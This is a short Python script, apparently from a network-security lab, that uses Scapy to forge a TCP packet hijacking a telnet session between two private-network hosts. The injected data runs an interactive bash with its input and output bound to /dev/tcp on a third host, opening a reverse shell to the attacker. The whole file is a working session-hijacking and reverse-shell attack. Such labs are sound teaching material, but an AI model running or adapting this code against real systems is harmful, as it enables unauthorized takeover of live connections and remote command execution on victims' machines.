#!/usr/bin/python3
import sys
from scapy.all import *

snum = 383432879
anum = 1904790332

print("SENDING SESSION HIJACKING PACKET.........")
IPLayer = IP(src="10.0.2.4", dst="10.0.2.5")
TCPLayer = TCP(sport=52884, dport=23, flags="A",
               seq=snum+10, ack=anum)
Data = "\r /bin/bash_shellshock -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1\r"
pkt = IPLayer/TCPLayer/Data
#ls(pkt)
send(pkt, verbose=0)
